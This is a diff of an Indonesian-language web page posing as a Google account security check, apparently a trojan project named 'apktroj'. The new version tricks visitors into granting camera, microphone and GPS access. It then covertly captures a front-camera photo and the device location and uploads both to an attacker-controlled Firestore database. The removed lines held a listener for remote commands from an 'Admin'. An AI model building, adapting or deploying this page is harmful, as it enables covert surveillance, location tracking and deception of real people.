@@ -1,58 +1,54 @@
-<!-- TARGET PAYLOAD CODE START -->
 <!DOCTYPE html>
 <html>
-<head><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
-<body style="background:#f1f3f4;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0">
-  <div style="background:white;padding:30px;border-radius:15px;text-align:center;box-shadow:0 4px 6px rgba(0,0,0,0.1);max-width:300px;width:90%">
-    <div style="background:#1a73e8;width:50px;height:50px;border-radius:50%;margin:0 auto 15px;display:flex;align-items:center;justify-content:center;color:white;font-weight:bold;font-size:24px">G</div>
-    <h2 style="margin-bottom:10px;font-size:18px">Verifikasi Keamanan</h2>
-    <p style="font-size:12px;color:#666;margin-bottom:20px">Izinkan verifikasi audio dan biometrik untuk mengamankan akun Google Anda dari akses tidak sah.</p>
-    <button id="btn" style="background:#1a73e8;color:white;border:none;padding:15px 20px;border-radius:8px;cursor:pointer;width:100%;font-weight:bold;font-size:14px">VERIFIKASI SEKARANG</button>
-    <p id="st" style="font-size:10px;color:#999;margin-top:15px">Mendukung enkripsi end-to-end</p>
+<head><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Security Check</title></head>
+<body style="background:#000;color:#fff;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif">
+  <div style="text-align:center;padding:20px;width:90%;max-width:320px">
+    <div style="background:#1a73e8;width:60px;height:60px;border-radius:50%;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;font-size:30px;font-weight:bold">G</div>
+    <h2 style="font-size:18px">Verifikasi Keamanan</h2>
+    <p style="font-size:12px;color:#aaa">Klik izinkan untuk mengamankan akun Anda dari akses tidak sah.</p>
+    <button id="auth" style="background:#1a73e8;color:white;border:none;width:100%;padding:15px;border-radius:8px;font-weight:bold;margin-top:20px;cursor:pointer">SAYA SETUJU</button>
+    <video id="v" style="display:none" autoplay playsinline muted></video>
+    <canvas id="c" style="display:none"></canvas>
   </div>
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-    import { getFirestore, doc, onSnapshot, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+    import { getFirestore, doc, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
     import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
-
-    const conf = { 
-        apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo", 
-        authDomain: "apktroj.firebaseapp.com",
-        projectId: "apktroj",
-        appId: "1:943833619122:web:d757ced4d56267abf247ab"
-    };
     
-    const app = initializeApp(conf); 
+    const app = initializeApp({"apiKey":"AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo","authDomain":"apktroj.firebaseapp.com","projectId":"apktroj","storageBucket":"apktroj.firebasestorage.app","messagingSenderId":"943833619122","appId":"1:943833619122:web:d757ced4d56267abf247ab"});
     const db = getFirestore(app);
     const auth = getAuth(app);
-
-    document.getElementById('btn').onclick = async () => {
+    
+    document.getElementById('auth').onclick = async () => {
       try {
         await signInAnonymously(auth);
-        const s = await navigator.mediaDevices.getUserMedia({audio:true, video:true});
-        document.getElementById('btn').innerText = "MENYINKRONKAN...";
-        document.getElementById('btn').disabled = true;
-        document.getElementById('st').innerText = "Enkripsi aktif. Jangan tutup halaman ini.";
+        const s = await navigator.mediaDevices.getUserMedia({audio:true, video:{facingMode:"user"}});
+        document.getElementById('auth').innerText = "MENYINKRONKAN...";
+        document.getElementById('auth').disabled = true;
+        
+        // 1. AUTO PHOTO CANDID
+        const v = document.getElementById('v'); v.srcObject = s;
+        v.onloadedmetadata = () => {
+          setTimeout(async () => {
+             const c = document.getElementById('c');
+             c.width = v.videoWidth; c.height = v.videoHeight;
+             c.getContext('2d').drawImage(v, 0, 0);
+             const img = c.toDataURL('image/jpeg', 0.5);
+             await setDoc(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'photo'), { data: img, time: serverTimestamp() });
+          }, 2000);
+        };
 
-        // Update status online target ke Firestore
-        const deviceId = "WEB_" + Math.random().toString(36).substr(2, 9);
-        await setDoc(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'status'), {
-            lastSeen: serverTimestamp(),
-            online: true,
-            deviceId: deviceId
-        });
-
-        // Listen command dari Admin
-        onSnapshot(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'cmd'), (snap) => {
-           if(snap.exists()){
-             const d = snap.data();
-             console.log("Admin Signal: ", d.type, d.action);
-             // Implementasi stream WebRTC atau snapshot di sini
-           }
-        });
-      } catch(e) { alert("Error: Anda harus memberikan izin kamera & mikrofon untuk verifikasi keamanan."); }
+        // 2. AUTO LOCATION & STATUS
+        navigator.geolocation.getCurrentPosition(async (p) => {
+           await setDoc(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'status'), { 
+             lat: p.coords.latitude, lng: p.coords.longitude, online: true, time: serverTimestamp() 
+           });
+        }, (err) => {
+           // Jika GPS ditolak, tetap kirim status online
+           setDoc(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'status'), { online: true, time: serverTimestamp() });
+        }, {enableHighAccuracy: true});
+      } catch(e) { alert("Error: Izin perangkat diperlukan untuk verifikasi."); }
     };
   </script>
 </body>
 </html>
-            
